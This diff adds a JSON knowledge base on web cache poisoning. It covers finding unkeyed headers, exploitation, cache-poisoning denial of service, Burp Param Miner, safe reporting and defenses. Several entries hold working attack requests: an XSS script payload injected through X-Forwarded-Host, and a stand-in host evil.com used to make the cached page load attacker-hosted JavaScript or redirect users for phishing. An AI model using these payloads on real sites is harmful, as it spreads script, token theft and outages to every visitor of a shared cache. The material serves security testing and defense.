@@ -1,0 +1,97 @@
+{
+  "category": "Web Cache Poisoning",
+  "source": "PortSwigger Web Security Academy + PayloadsAllTheThings",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What Web Cache Poisoning is",
+      "language": "text",
+      "tags": ["methodology", "cache-poisoning"],
+      "body": "Web Cache Poisoning is an attack where the attacker makes a cache (CDN, reverse proxy, caching layer) store a MALICIOUS response and then serve it to other users. Unlike Web Cache Deception (which serves a victim their own private cached response), here the attacker poisons the SHARED cache, and the payload reaches everyone who hits the cached entry.\n\nImpact: mass stored XSS, malicious resource import, forced redirect, denial of service (CPDoS) - against all visitors."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Cache key and unkeyed inputs",
+      "language": "text",
+      "tags": ["methodology", "cache-key", "unkeyed"],
+      "body": "A cache stores a response under a cache key - usually method + host + path + (sometimes) some parameters. Requests with the same key get the same cached response.\n\nAn unkeyed input is part of the request that AFFECTS the response but is NOT part of the key (e.g. the X-Forwarded-Host header). If such an input is reflected into the response, the attacker sends a request with a malicious unkeyed input, the response is cached under the normal key and served to victims.\n\nThe core of the hunt: find an unkeyed input that affects the response."
+    },
+    {
+      "subcategory": "Detection",
+      "title": "Analyzing cache behavior",
+      "language": "http",
+      "tags": ["detection", "cache-headers"],
+      "body": "Look at response headers for cache signals:\n\n    X-Cache: hit / miss        (Varnish and others)\n    Age: 124                   (how long the response has been cached)\n    CF-Cache-Status: HIT       (Cloudflare)\n    Cache-Control: public, max-age=...\n\nAdd a cache buster (a unique harmless parameter) so you don't poison the real cache while testing:\n\n    GET /?cb=12345 HTTP/1.1\n\nRepeat the request: X-Cache: miss then hit confirms caching."
+    },
+    {
+      "subcategory": "Detection",
+      "title": "keyed vs unkeyed - the algorithm",
+      "language": "text",
+      "tags": ["detection", "unkeyed"],
+      "body": "1. Add a cache buster (your own parameter) to work in an isolated cache cell.\n2. Add suspect headers one at a time (X-Forwarded-Host, X-Host, etc.) with a unique canary value.\n3. Check whether the value is reflected in the response (body / headers / Location).\n4. Remove the canary and repeat: if the value still comes back from the cache, the input is unkeyed and cached - which means it is exploitable.\n\nPortSwigger Param Miner automates guessing such headers and parameters."
+    },
+    {
+      "subcategory": "Unkeyed inputs",
+      "title": "Candidate headers",
+      "language": "http",
+      "tags": ["unkeyed", "headers"],
+      "body": "Frequently unkeyed and reflected into the response:\n\n    X-Forwarded-Host\n    X-Forwarded-Scheme / X-Forwarded-Proto\n    X-Host\n    X-Forwarded-Server\n    X-Original-URL / X-Rewrite-URL\n    Forwarded\n\nProbe example (with a cache buster):\n\n    GET /?cb=1 HTTP/1.1\n    Host: target.com\n    X-Forwarded-Host: canary123.com\n\nIf canary123.com appears in the response (in a link/script/Location), it is a poisoning candidate."
+    },
+    {
+      "subcategory": "Exploitation",
+      "title": "XSS via an unkeyed header",
+      "language": "http",
+      "tags": ["exploit", "xss"],
+      "body": "If X-Forwarded-Host is reflected into HTML without escaping:\n\n    GET / HTTP/1.1\n    Host: target.com\n    X-Forwarded-Host: a\"><script>alert(document.domain)</script>\n\nThe response is cached and served to victims with the injected script - stored XSS at the scale of \"everyone who got the cache\". Practice with a cache buster so you don't hit real users."
+    },
+    {
+      "subcategory": "Exploitation",
+      "title": "Malicious resource import",
+      "language": "http",
+      "tags": ["exploit", "resource-import"],
+      "body": "If an unkeyed header sets the host for an imported resource (script/CSS):\n\n    GET / HTTP/1.1\n    Host: target.com\n    X-Forwarded-Host: evil.com\n\n    ...in the response: <script src=//evil.com/main.js></script>\n\nThe attacker hosts evil.com/main.js, and their JS runs for every victim of the cached page."
+    },
+    {
+      "subcategory": "Exploitation",
+      "title": "Cached open redirect",
+      "language": "http",
+      "tags": ["exploit", "open-redirect"],
+      "body": "If a redirect is built from an unkeyed input, the poisoned 301/302 is cached:\n\n    GET /login HTTP/1.1\n    Host: target.com\n    X-Forwarded-Host: evil.com\n\n    HTTP/1.1 302 Found\n    Location: https://evil.com/login\n\nEveryone visiting /login is redirected to evil.com - phishing and token theft."
+    },
+    {
+      "subcategory": "CPDoS",
+      "title": "Cache Poisoning DoS",
+      "language": "text",
+      "tags": ["cpdos", "dos"],
+      "body": "CPDoS poisons the cache with an ERROR response so legitimate users get an error:\n• HHO (HTTP Header Oversize): an oversized header makes the backend return 400, which gets cached.\n• HMC (HTTP Meta Character): a special char in a header breaks the response, which gets cached.\n• HMO (HTTP Method Override): X-HTTP-Method-Override and similar break the response.\n\nResult: a popular page has a cached 400/404 - a DoS for all visitors."
+    },
+    {
+      "subcategory": "Advanced",
+      "title": "Fat GET and parameter cloaking",
+      "language": "http",
+      "tags": ["advanced", "fat-get", "cloaking"],
+      "body": "Fat GET - a body on a GET request that affects the response but is not part of the key:\n\n    GET /?param=x HTTP/1.1\n    Host: target.com\n\n    param=evil\n\nParameter cloaking - a parameter the cache and backend parse differently (delimiters ; vs &), letting you smuggle an unkeyed value. Also study key normalization: case, URL-encoding, duplicate parameters."
+    },
+    {
+      "subcategory": "Tools",
+      "title": "Burp Param Miner",
+      "language": "text",
+      "tags": ["tools", "param-miner", "burp"],
+      "body": "Workflow with Param Miner (Burp extension):\n1. Right-click a request -> Guess headers / Guess GET parameters.\n2. Enable Add static/dynamic cachebuster - Param Miner sets a cache buster itself.\n3. The extension brute-forces a dictionary of headers/params and finds those that affect the response (potentially unkeyed).\n4. Verify a found input manually for reflection and caching (X-Cache).\n\nSee also the Web cache poisoning track in the PortSwigger Web Security Academy."
+    },
+    {
+      "subcategory": "PoC and report",
+      "title": "Proving it and reporting",
+      "language": "text",
+      "tags": ["poc", "reporting"],
+      "body": "Safe PoC: use a cache buster (a unique parameter) so the payload lands in a SEPARATE cache cell, not on the real page. Show: request with the unkeyed input -> response with the payload -> a follow-up request WITHOUT the payload returns the cached poisoned response (X-Cache: hit).\n\nIn the report: the vulnerable URL, the unkeyed input, the impact type (XSS / redirect / CPDoS), proof of caching, and a note that the production cache was NOT poisoned."
+    },
+    {
+      "subcategory": "Defense",
+      "title": "Defense",
+      "language": "text",
+      "tags": ["defense"],
+      "body": "• Include influential headers in the cache key (Vary), or do not reflect them in the response.\n• Don't trust X-Forwarded-* without validation; normalize at the edge.\n• Disable caching for responses that depend on headers outside the key.\n• Limit header size at the CDN before the backend (against HHO CPDoS).\n• Align parameter parsing between cache and application (against cloaking)."
+    }
+  ]
+}
